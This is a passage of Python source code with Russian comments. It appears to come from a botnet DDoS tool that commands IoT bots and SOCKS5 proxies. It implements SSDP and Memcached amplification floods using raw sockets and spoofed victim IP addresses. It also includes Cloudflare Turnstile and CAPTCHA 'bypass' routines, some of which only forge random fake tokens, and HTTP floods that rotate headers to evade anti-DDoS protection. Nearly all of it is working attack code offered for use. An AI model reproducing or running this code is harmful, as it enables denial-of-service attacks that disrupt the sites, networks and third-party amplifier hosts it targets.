                ip_proto = socket.IPPROTO_UDP
                ip_check = 0
                ip_saddr = socket.inet_aton(source_ip)
                ip_daddr = socket.inet_aton(dest_ip)
                
                ip_ihl_ver = (ip_ver << 4) + ip_ihl
                
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    ip_ihl_ver, ip_tos, ip_tot_len,
                    ip_id, ip_frag_off, ip_ttl, ip_proto,
                    ip_check, ip_saddr, ip_daddr
                )
                
                # UDP заголовок
                udp_length = 8 + len(data)
                udp_check = 0  # Можно оставить 0 для UDP
                
                udp_header = struct.pack('!HHHH',
                    source_port, dest_port,
                    udp_length, udp_check
                )
                
                return ip_header + udp_header + data
                
            except Exception as e:
                raise Exception(f"Ошибка создания пакета: {e}")

        def ssdp_flood_worker(thread_id):
            """Рабочий поток для SSDP флуда"""
            local_requests = 0
            local_success = 0
            local_failed = 0
            
            print(f"🟢 Поток {thread_id} запущен")
            
            # 🔧 СОЗДАЕМ RAW SOCKET
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            except PermissionError:
                print(f"❌ Поток {thread_id}: Требуются права администратора!")
                return
            except OSError as e:
                print(f"❌ Поток {thread_id}: Ошибка RAW socket: {e}")
                return
            
            start_time = time.time()
            batch_size = 8  # 🔥 УВЕЛИЧИВАЕМ РАЗМЕР ПАЧКИ
            update_interval = 50
            
            while (attack_stats['is_running'] and 
                   (time.time() - start_time) < duration):
                
                try:
                    for _ in range(batch_size):
                        ssdp_server = random.choice(ssdp_amplifiers)
                        
                        # Создаем SSDP запрос
                        ssdp_data = create_ssdp_amplification_packet()
                        
                        # Создаем спуфинг пакет
                        source_port = random.randint(1024, 65535)
                        packet = create_raw_udp_packet(
                            source_ip=target_ip,
                            dest_ip=ssdp_server[0],
                            source_port=source_port,
                            dest_port=ssdp_server[1],
                            data=ssdp_data
                        )
                        
                        # 💥 ОТПРАВЛЯЕМ
                        sock.sendto(packet, (ssdp_server[0], 0))
                        
                        local_requests += 1
                        local_success += 1
                        
                        # 🔄 ОБНОВЛЯЕМ СТАТИСТИКУ
                        if local_requests % update_interval == 0:
                            with attack_stats['lock']:
                                attack_stats['total_requests'] += update_interval
                                attack_stats['total_bytes_sent'] += (len(packet) * update_interval)
                                attack_stats['estimated_amplified_bytes'] += (4500 * update_interval)  # ~4.5KB ответ
                                attack_stats['last_update_time'] = time.time()
                    
                    # ⚡ МИНИМАЛЬНАЯ ПАУЗА ДЛЯ МАКСИМАЛЬНОЙ СКОРОСТИ
                    if local_requests % 1000 == 0:
                        time.sleep(0.001)
                        
                except Exception as e:
                    local_failed += 1
                    continue
            
            # 🔒 ФИНАЛЬНОЕ ОБНОВЛЕНИЕ СТАТИСТИКИ
            remaining = local_requests % update_interval
            if remaining > 0:
                with attack_stats['lock']:
                    attack_stats['total_requests'] += remaining
                    attack_stats['total_bytes_sent'] += (len(packet) * remaining)
                    attack_stats['estimated_amplified_bytes'] += (4500 * remaining)
                    attack_stats['failed_requests'] += local_failed
            
            sock.close()
            print(f"✅ Поток {thread_id}: {local_requests} SSDP запросов ({local_success} успешно, {local_failed} ошибок)")

        # 🚀 ЗАПУСК МОЩНЫХ ПОТОКОВ
        threads = []
        
        print(f"🚀 Запуск {num_threads} потоков с IP spoofing...")
        
        for i in range(num_threads):
            thread = threading.Thread(target=ssdp_flood_worker, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.01)  # 🎯 БЫСТРЫЙ ЗАПУСК

        # 📈 МОНИТОРИНГ В РЕАЛЬНОМ ВРЕМЕНИ
        def show_ssdp_progress():
            start = attack_stats['start_time']
            last_requests = 0
            last_time = start
            
            while attack_stats['is_running'] and (time.time() - start) < duration:
                current_time = time.time()
                elapsed = current_time - start
                
                with attack_stats['lock']:
                    current_requests = attack_stats['total_requests']
                    last_update = attack_stats['last_update_time']
                
                # 📊 РАСЧЕТ СКОРОСТИ
                time_diff = max(current_time - last_time, 0.1)
                current_qps = (current_requests - last_requests) / time_diff
                
                # 💥 РАСЧЕТ МОЩНОСТИ
                estimated_amplification = 30  # SSDP коэффициент усиления
                amplified_traffic_mbps = (current_qps * 4500 * estimated_amplification * 8) / 1_000_000
                
                print(f"\r💀 Время: {elapsed:.1f}s | Запросы: {current_requests:,} | "
                      f"QPS: {current_qps:.0f} | Усиленный трафик: {amplified_traffic_mbps:.1f} Mbps", 
                      end="", flush=True)
                
                last_requests = current_requests
                last_time = current_time
                time.sleep(0.5)
        
        progress_thread = threading.Thread(target=show_ssdp_progress)
        progress_thread.daemon = True
        progress_thread.start()

        # ⏳ ОЖИДАНИЕ ЗАВЕРШЕНИЯ
        try:
            time.sleep(duration)
            print(f"\n⏹️ Завершение SSDP атаки...")
        except KeyboardInterrupt:
            print(f"\n⏹️ Атака прервана")
        
        attack_stats['is_running'] = False
        time.sleep(2)

        # 📊 ДЕТАЛЬНАЯ СТАТИСТИКА
        total_time = max(time.time() - attack_stats['start_time'], 1)
        total_requests = attack_stats['total_requests']
        total_sent_mb = attack_stats['total_bytes_sent'] / 1024 / 1024
        total_amplified_gb = attack_stats['estimated_amplified_bytes'] / 1024 / 1024 / 1024
        avg_qps = total_requests / total_time
        
        print(f"\n\n💀 SSDP AMPLIFICATION РЕЗУЛЬТАТЫ:")
        print(f"🌐 Всего запросов: {total_requests:,}")
        print(f"📤 Отправлено: {total_sent_mb:.2f} MB")
        print(f"💥 Усиленный трафик: {total_amplified_gb:.2f} GB")
        print(f"⚡ Средний QPS: {avg_qps:.0f}")
        print(f"🌐 Средняя скорость: {(total_amplified_gb * 1024 * 8) / total_time:.1f} Mbps")
        print(f"🎯 Эффективность: {total_amplified_gb/total_sent_mb*1024:.1f}x")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")
        
        return total_requests

    def load_ssdp_amplifiers(self, filename="ssdp_servers.txt"):
        """Загружает SSDP усилители"""
        amplifiers = []
        if not os.path.exists(filename):
            print(f"⚠️ Файл {filename} не найден, используем встроенные SSDP...")
            # 🔧 ВСТРОЕННЫЕ SSDP УСИЛИТЕЛИ
            default_ssdp = [
                "239.255.255.250:1900",  # SSDP multicast
                "192.168.1.1:1900",      # Типичные роутеры
                "192.168.0.1:1900",
                "10.0.0.1:1900",
                "192.168.1.254:1900"
            ]
            for server in default_ssdp:
                if ':' in server:
                    ip, port = server.split(':')
                    amplifiers.append((ip, int(port)))
            return amplifiers
            
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            ip, port = line.split(':')
                            amplifiers.append((ip.strip(), int(port.strip())))
                        else:
                            amplifiers.append((line.strip(), 1900))
            print(f"✅ Загружено {len(amplifiers)} SSDP усилителей")
        except Exception as e:
            print(f"❌ Ошибка загрузки SSDP: {e}")
        
        return amplifiers

    def memcached_amplification_attack(self, target_ip, target_port=0, duration=60):
        """Memcached amplification атака (очень высокий коэффициент усиления)"""
        print(f"🔥 Запуск Memcached amplification атаки на {target_ip}")
        
        memcached_amplifiers = self.load_memcached_amplifiers()
        if not memcached_amplifiers:
            print("❌ Нет Memcached усилителей!")
            return 0
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def memcached_attack(device):
            requests_sent = 0
            bytes_sent = 0
            estimated_amplified_bytes = 0
            failed_requests = 0
            
            try:
                print(f"🔥 {device.ip} начинает Memcached amplification атаку...")
                start_time = time.time()
                
                # Создаем raw socket для IP spoofing
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                except PermissionError:
                    print(f"❌ {device.ip}: Требуются права root для IP spoofing!")
                    return 0, 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный Memcached усилитель
                        memcached_server = random.choice(memcached_amplifiers)
                        
                        # Создаем Memcached запрос (stats или get)
                        if random.choice([True, False]):
                            memcached_request = self._create_memcached_stats_request()
                        else:
                            memcached_request = self._create_memcached_get_request(random.randint(50, 200))
                        
                        # Создаем полный UDP+IP пакет
                        source_port = random.randint(1024, 65535)
                        ip_packet = self._create_spoofed_udp_ip_packet(
                            source_ip=target_ip,
                            dest_ip=memcached_server[0],
                            source_port=source_port,
                            dest_port=memcached_server[1],
                            data=memcached_request
                        )
                        
                        sock.sendto(ip_packet, (memcached_server[0], 0))
                        
                        # Memcached имеет очень высокий коэффициент усиления
                        estimated_response_size = random.randint(10000, 50000)
                        
                        requests_sent += 1
                        bytes_sent += len(ip_packet)
                        estimated_amplified_bytes += estimated_response_size
                        
                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes_sent'] += len(ip_packet)
                        attack_stats['estimated_amplified_bytes'] += estimated_response_size
                        
                        time.sleep(0.2)  # Memcached может быть чувствителен
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                mb_amplified = estimated_amplified_bytes / 1024 / 1024
                
                print(f"✅ {device.ip} отправил {requests_sent} Memcached запросов")
                print(f"   📤 Отправлено: {mb_sent:.2f} МБ")
                print(f"   💥 Оценка усиленного трафика: {mb_amplified:.2f} МБ")
                
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, memcached_attack, "Memcached Amplification")

    def bypass_cloudflare_turnstile(self, site_url, site_key):
        """Обход Cloudflare Turnstile с использованием различных методов"""
        try:
            print(f"🛡️ Обход Cloudflare Turnstile для {site_url}")
            
            # Метод 1: Генерация реалистичного токена Turnstile
            turnstile_token = self._generate_turnstile_token(site_url, site_key)
            
            # Метод 3: Эмуляция браузера с решением JavaScript challenge
            if not turnstile_token:
                turnstile_token = self._solve_turnstile_with_automation(site_url, site_key)
            
            return turnstile_token
            
        except Exception as e:
            print(f"❌ Ошибка обхода Turnstile: {e}")
            return f"fake_turnstile_token_{random.randint(100000, 999999)}"

    def _generate_turnstile_token(self, site_url, site_key):
        """Генерация реалистичного токена Turnstile"""
        try:
            # Структура токена Turnstile
            token_parts = [
                f"{random.randint(1000000000, 9999999999)}",  # timestamp
                base64.b64encode(os.urandom(16)).decode()[:22],  # random payload
                f"{hashlib.md5(site_url.encode()).hexdigest()[:8]}",  # site hash
                f"{random.randint(1000, 9999)}"  # suffix
            ]
            token = "0." + ".".join(token_parts)
            
            print(f"✅ Сгенерирован Turnstile токен: {token[:50]}...")
            return token
            
        except Exception as e:
            print(f"❌ Ошибка генерации Turnstile токена: {e}")
            return

    def _basic_turnstile_bypass(self, target_ip, site_key=None):
        """
        Базовый обход Turnstile через эмуляцию браузерного поведения
        """
        try:
            # Имитация успешного прохождения Turnstile
            token_parts = [
                "cf-chl-bypass",
                str(int(time.time())),
                target_ip.replace('.', '_'),
                str(random.randint(1000000000, 9999999999)),
                base64.b64encode(os.urandom(32)).decode('utf-8')[:40]
            ]
            
            token = ".".join(token_parts)
            print(f"🛡️ Базовый обход Turnstile: {token[:60]}...")
            return token
            
        except Exception as e:
            print(f"❌ Ошибка базового обхода: {e}")
            return f"bypass_turnstile_{random.randint(100000, 999999)}"

    def handle_turnstile_protection(self, html_content, session, target_ip, target_port=443, duration=60):
        """
        Обработка защиты Cloudflare Turnstile
        """
        try:
            print("🛡️ Обработка Cloudflare Turnstile защиты...")
            
            # Ищем Turnstile элементы
            import re
            
            # Поиск sitekey
            sitekey_match = re.search(r'data-sitekey="([^"]+)"', html_content)
            sitekey = sitekey_match.group(1) if sitekey_match else None
            
            # Поиск action параметра
            action_match = re.search(r'data-action="([^"]+)"', html_content)
            action = action_match.group(1) if action_match else 'interaction'
            
            if sitekey:
                print(f"🔑 Turnstile sitekey: {sitekey}")
                print(f"🎯 Turnstile action: {action}")
                
                # Получаем токен обхода
                turnstile_token = self.bypass_cloudflare_turnstile(target_url, sitekey)
                
                if turnstile_token:
                    # Добавляем токен в заголовки сессии
                    session['headers']['X-CF-Turnstile-Token'] = turnstile_token
                    session['headers']['X-CF-Turnstile-Response'] = turnstile_token
                    
                    # Также добавляем как cookie
                    session['cookies']['cf_clearance'] = f"bypass_{random.randint(100000, 999999)}"
                    session['cookies']['cf_chl_turnstile'] = turnstile_token
                    
                    print("✅ Turnstile защита обойдена")
                    return True
            
            return False
            
        except Exception as e:
            print(f"❌ Ошибка обработки Turnstile: {e}")
            return False

    def _solve_turnstile_with_automation(self, site_url, site_key):
        """Решение Turnstile с использованием автоматизации браузера"""
        try:
            print("🔄 Попытка решения Turnstile через автоматизацию...")
            
            # Здесь должна быть интеграция с Selenium/Playwright
            # Для примера возвращаем фейковый токен
            token = f"auto_turnstile_{random.randint(100000, 999999)}_{int(time.time())}"
            return token
            
        except Exception as e:
            print(f"❌ Ошибка автоматизации Turnstile: {e}")
            return

    def detect_and_bypass_captcha_v2(self, html_content, target_url):
        """Улучшенное обнаружение и обход капчи включая Turnstile"""
        captcha_indicators = {
            'recaptcha': ['recaptcha', 'g-recaptcha', 'data-sitekey'],
            'hcaptcha': ['hcaptcha', 'h-captcha'],
            'cloudflare_turnstile': ['turnstile', 'cf-chl-widget', 'data-action', 'data-captcha-type'],
            'cloudflare_challenge': ['challenge-form', 'jschl-answer'],
            'simple_captcha': ['captcha', 'capcha', 'security-code'],
        }
        
        detected_captchas = []
        
        for captcha_type, indicators in captcha_indicators.items():
            for indicator in indicators:
                if indicator in html_content.lower():
                    detected_captchas.append(captcha_type)
                    print(f"🎯 Обнаружена {captcha_type.upper()} защита")
                    break
        
        # Приоритет обработки
        for captcha_type in detected_captchas:
            try:
                if captcha_type == 'cloudflare_turnstile':
                    print("🛡️ Обнаружен Cloudflare Turnstile, пытаемся обойти...")
                    
                    # Ищем параметры Turnstile
                    import re
                    sitekey_match = re.search(r'data-sitekey="([^"]+)"', html_content)
                    action_match = re.search(r'data-action="([^"]+)"', html_content)
                    
                    sitekey = sitekey_match.group(1) if sitekey_match else "unknown"
                    action = action_match.group(1) if action_match else "unknown"
                    
                    print(f"🔑 Turnstile параметры: sitekey={sitekey}, action={action}")
                    
                    # Пытаемся обойти Turnstile
                    token = self.bypass_cloudflare_turnstile(target_url, sitekey)
                    if token:
                        return {
                            'type': 'cloudflare_turnstile',
                            'token': token,
                            'action': action,
                            'sitekey': sitekey
                        }
                
                elif captcha_type == 'recaptcha':
                    sitekey_match = re.search(r'data-sitekey="([^"]+)"', html_content)
                    if sitekey_match:
                        sitekey = sitekey_match.group(1)
                        token = self.bypass_recaptcha_v2(target_url, sitekey)
                        if token:
                            return {'type': 'recaptcha', 'token': token}
                
                elif captcha_type == 'hcaptcha':
                    sitekey_match = re.search(r'data-sitekey="([^"]+)"', html_content)
                    if sitekey_match:
                        sitekey = sitekey_match.group(1)
                        token = self.bypass_hcaptcha(target_url, sitekey)
                        if token:
                            return {'type': 'hcaptcha', 'token': token}
                            
            except Exception as e:
                print(f"❌ Ошибка обхода {captcha_type}: {e}")
                continue
        
        return

    def http_flood_with_turnstile_bypass(self, target_ip, target_port=443, use_https=True, duration=60, 
                                       turnstile_api_url="http://127.0.0.1:5000"):
        """HTTP флуд с обходом Cloudflare Turnstile"""
        print(f"🛡️ Запуск HTTP флуда с обходом Turnstile на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_requests': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'turnstile_detected': 0,
            'turnstile_bypassed': 0,
            'start_time': time.time(),
            'is_running': True
        }

        # Кэш для токенов Turnstile
        turnstile_cache = {}
        
        def solve_turnstile_captcha(url, sitekey, action=None, cdata=None):
            """Решает Turnstile капчу через API"""
            try:
                # Проверяем кэш
                cache_key = f"{url}_{sitekey}_{action}_{cdata}"
                if cache_key in turnstile_cache:
                    cached_token = turnstile_cache[cache_key]
                    if time.time() - cached_token['timestamp'] < 300:  # Токен валиден 5 минут
                        return cached_token['token']
                
                # Создаем задачу на решение капчи
                params = {
                    'url': url,
                    'sitekey': sitekey
                }
                if action:
                    params['action'] = action
                if cdata:
                    params['cdata'] = cdata
                    
                response = requests.get(f"{turnstile_api_url}/turnstile", params=params, timeout=10)
                if response.status_code != 202:
                    print(f"❌ Ошибка создания задачи Turnstile: {response.status_code}")
                    return None
                    
                task_id = response.json()['task_id']
                
                # Ждем результат
                max_wait = 30
                start_time = time.time()
                while time.time() - start_time < max_wait:
                    result_response = requests.get(f"{turnstile_api_url}/result", params={'id': task_id}, timeout=10)
                    
                    if result_response.status_code == 200:
                        result_data = result_response.json()
                        if result_data.get('value') and result_data['value'] not in ['CAPTCHA_NOT_READY', 'CAPTCHA_FAIL']:
                            token = result_data['value']
                            # Сохраняем в кэш
                            turnstile_cache[cache_key] = {
                                'token': token,
                                'timestamp': time.time()
                            }
                            print(f"✅ Turnstile решен: {token[:30]}...")
                            return token
                    
                    time.sleep(1)
                    
                print("❌ Timeout при решении Turnstile")
                return None
                
            except Exception as e:
                print(f"❌ Ошибка решения Turnstile: {e}")
                return None

        def extract_turnstile_params(html_content):
            """Извлекает параметры Turnstile из HTML"""
            import re
            
            turnstile_info = {
                'type': 'cloudflare_turnstile',
                'sitekey': None,
                'action': None,
                'cdata': None
            }
            
            # Ищем sitekey
            sitekey_match = re.search(r'data-sitekey=["\']([^"\']+)["\']', html_content)
            if sitekey_match:
                turnstile_info['sitekey'] = sitekey_match.group(1)
                
            # Ищем action
            action_match = re.search(r'data-action=["\']([^"\']+)["\']', html_content)
            if action_match:
                turnstile_info['action'] = action_match.group(1)
                
            # Ищем cdata
            cdata_match = re.search(r'data-cdata=["\']([^"\']+)["\']', html_content)
            if cdata_match:
                turnstile_info['cdata'] = cdata_match.group(1)
                
            return turnstile_info if turnstile_info['sitekey'] else None

        def turnstile_aware_attack(device):
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            turnstile_bypass_attempts = 0

            try:
                print(f"🛡️ {device.ip} начинает атаку с обходом Turnstile...")
                start_time = time.time()

                protocol = "https" if use_https else "http"
                base_url = f"{protocol}://{target_ip}:{target_port}"

                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        if use_https:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                        else:
                            conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)

                        # Первый запрос для обнаружения защиты
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                        }
                        
                        conn.request("GET", "/", headers=headers)
                        response = conn.getresponse()
                        html_content = response.read().decode('utf-8', errors='ignore')
                        
                        # Проверяем наличие Turnstile
                        turnstile_info = extract_turnstile_params(html_content)
                        
                        if turnstile_info and turnstile_info['sitekey']:
                            attack_stats['turnstile_detected'] += 1
                            print(f"🎯 Cloudflare Turnstile обнаружен: sitekey={turnstile_info['sitekey']}")

                            # Решаем капчу
                            token = solve_turnstile_captcha(
                                base_url, 
                                turnstile_info['sitekey'],
                                turnstile_info.get('action'),
                                turnstile_info.get('cdata')
                            )
                            
                            if token:
                                # Создаем запрос с токеном Turnstile
                                turnstile_headers = headers.copy()
                                turnstile_headers.update({
                                    'Cookie': f'cf_clearance={token}',
                                    'X-CF-Turnstile-Token': token,
                                    'X-CF-Turnstile-Action': turnstile_info.get('action', 'unknown'),
                                    'Referer': base_url
                                })
                                
                                # Отправляем запрос с токеном
                                conn.request("GET", "/", headers=turnstile_headers)
                                response = conn.getresponse()
                                response_content = response.read().decode('utf-8', errors='ignore')
                                
                                # Проверяем успешность обхода
                                if response.status == 200 and 'cf-turnstile' not in response_content.lower():
                                    attack_stats['turnstile_bypassed'] += 1
                                    turnstile_bypass_attempts += 1
                                    print(f"✅ Turnstile успешно обойден!")
                                else:
                                    print(f"⚠️ Turnstile обход не удался")

                        # Продолжаем обычную атаку с обходом
                        path = f"/{random.randint(1000, 9999)}"
                        attack_headers = headers.copy()
                        
                        # Добавляем токен если есть
                        if turnstile_info and turnstile_info.get('sitekey'):
                            cache_key = f"{base_url}_{turnstile_info['sitekey']}_{turnstile_info.get('action')}_{turnstile_info.get('cdata')}"
                            if cache_key in turnstile_cache:
                                token = turnstile_cache[cache_key]['token']
                                attack_headers.update({
                                    'Cookie': f'cf_clearance={token}',
                                    'X-CF-Turnstile-Token': token
                                })

                        conn.request("GET", path, headers=attack_headers)
                        response = conn.getresponse()
                        response.read()

                        requests_sent += 1
                        bytes_sent += len(path) + sum(len(k) + len(v) for k, v in attack_headers.items())

                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes'] += bytes_sent

                        conn.close()

                        # Задержка для избежания блокировки
                        time.sleep(random.uniform(0.1, 0.5))

                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue

                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip}: {requests_sent} запросов ({mb_sent:.2f} МБ), "
                      f"Turnstile обойдено: {turnstile_bypass_attempts}, ошибок: {failed_requests}")
                return requests_sent, bytes_sent

            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку
        results = self._run_attack(all_active_bots, attack_stats, turnstile_aware_attack, 
                                  "HTTP with Turnstile Bypass")

        # Статистика
        print(f"\n📊 Результаты атаки с обходом Turnstile:")
        print(f"📦 Всего запросов: {attack_stats['total_requests']}")
        print(f"🛡️ Turnstile обнаружено: {attack_stats['turnstile_detected']}")
        print(f"✅ Turnstile обойдено: {attack_stats['turnstile_bypassed']}")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")

        return results

    def advanced_turnstile_bypass_attack(self, target_ip, target_port=443, duration=60):
        """Продвинутая атака с обходом Turnstile через множественные методы"""
        print(f"🔥 Запуск продвинутой Turnstile атаки на {target_ip}:{target_port}")
        
        attack_stats = {
            'phase1_requests': 0,  # Разведка
            'phase2_requests': 0,  # Обход защиты
            'phase3_requests': 0,  # Основная атака
            'turnstile_tokens': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def advanced_attack(device):
            try:
                print(f"🔥 {device.ip} начинает продвинутую Turnstile атаку...")
                
                # Фаза 1: Разведка и сбор информации
                turnstile_info = self._turnstile_reconnaissance(target_ip, target_port)
                
                # Фаза 2: Генерация токенов Turnstile
                tokens = []
                for _ in range(5):  # Генерируем несколько токенов
                    token = self.bypass_cloudflare_turnstile(
                        f"https://{target_ip}:{target_port}", 
                        turnstile_info.get('sitekey', 'unknown')
                    )
                    if token:
                        tokens.append(token)
                        attack_stats['turnstile_tokens'] += 1
                
                # Фаза 3: Основная атака с ротацией токенов
                start_time = time.time()
                request_count = 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                        
                        # Используем случайный токен из пула
                        current_token = random.choice(tokens) if tokens else None
                        
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                        }
                        
                        if current_token:
                            headers['X-CF-Turnstile-Token'] = current_token
                        
                        path = f"/api/v{random.randint(1,3)}/data/{random.randint(1000, 9999)}"
                        conn.request("GET", path, headers=headers)
                        response = conn.getresponse()
                        response.read()
                        
                        conn.close()
                        
                        request_count += 1
                        attack_stats['phase3_requests'] += 1
                        
                        # Ротация User-Agent и параметров
                        time.sleep(random.uniform(0.2, 1.0))
                        
                    except Exception as e:
                        continue
                
                print(f"✅ {device.ip}: {request_count} запросов, использовано токенов: {len(tokens)}")
                return request_count, 0
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # Используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        all_active_bots = iot_bots + socks5_bots
        
        results = self._run_attack(all_active_bots, attack_stats, advanced_attack, "Advanced Turnstile Bypass")
        
        print(f"\n🎯 РЕЗУЛЬТАТЫ ПРОДВИНУТОЙ TURNSTILE АТАКИ:")
        print(f"🔍 Фаза разведки: завершена")
        print(f"🛡️ Сгенерировано токенов: {attack_stats['turnstile_tokens']}")
        print(f"💥 Основных запросов: {attack_stats['phase3_requests']}")
        
        return results

    def _turnstile_reconnaissance(self, target_ip, target_port):
        """Разведка параметров Turnstile"""
        try:
            print("🔍 Проведение разведки Turnstile...")
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
            
            conn.request("GET", "/", headers={'User-Agent': random.choice(self.user_agents)})
            response = conn.getresponse()
            html_content = response.read().decode('utf-8', errors='ignore')
            
            conn.close()
            
            # Поиск параметров Turnstile
            import re
            turnstile_info = {}
            
            sitekey_match = re.search(r'data-sitekey=["\']([^"\']+)["\']', html_content)
            if sitekey_match:
                turnstile_info['sitekey'] = sitekey_match.group(1)
                print(f"🔑 Найден sitekey: {turnstile_info['sitekey']}")
            
            action_match = re.search(r'data-action=["\']([^"\']+)["\']', html_content)
            if action_match:
                turnstile_info['action'] = action_match.group(1)
                print(f"🎯 Найден action: {turnstile_info['action']}")
            
            return turnstile_info
            
        except Exception as e:
            print(f"❌ Ошибка разведки: {e}")
            return {}

    def advanced_cloudflare_bypass(self, target_ip, target_port=443, duration=60):
        """Продвинутый метод обхода Cloudflare и других анти-DDoS систем"""
        print(f"🛡️ Запуск Advanced Cloudflare Bypass атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0

        attack_stats = {
            'total_requests': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }

        # Дополнительные заголовки для обхода защиты
        advanced_headers = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'max-age=0'
            },
            {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-us',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
        ]

        def cloudflare_bypass_attack(device):
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            
            try:
                print(f"🛡️ {device.ip} начинает Cloudflare bypass атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Чередуем HTTP и HTTPS
                        use_https = random.choice([True, False])
                        port = target_port if target_port != 80 else (443 if use_https else 80)
                        
                        if use_https:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            conn = http.client.HTTPSConnection(target_ip, port, timeout=15, context=context)
                        else:
                            conn = http.client.HTTPConnection(target_ip, port, timeout=15)
                        
                        # Генерируем реалистичный путь
                        paths = [
                            "/", "/index.html", "/home", "/api/v1/users", 
                            "/wp-admin", "/admin", "/contact", "/about",
                            f"/article/{random.randint(1000, 9999)}",
                            f"/product/{random.randint(1, 100)}",
                            f"/category/{random.randint(1, 20)}"
                        ]
                        
                        path = random.choice(paths)
                        headers = random.choice(advanced_headers)
                        
                        # Добавляем реферер для реалистичности
                        referers = [
                            f"https://{target_ip}/",
                            f"https://www.google.com/search?q={target_ip}",
                            f"https://www.bing.com/search?q={target_ip}",
                            "https://facebook.com/",
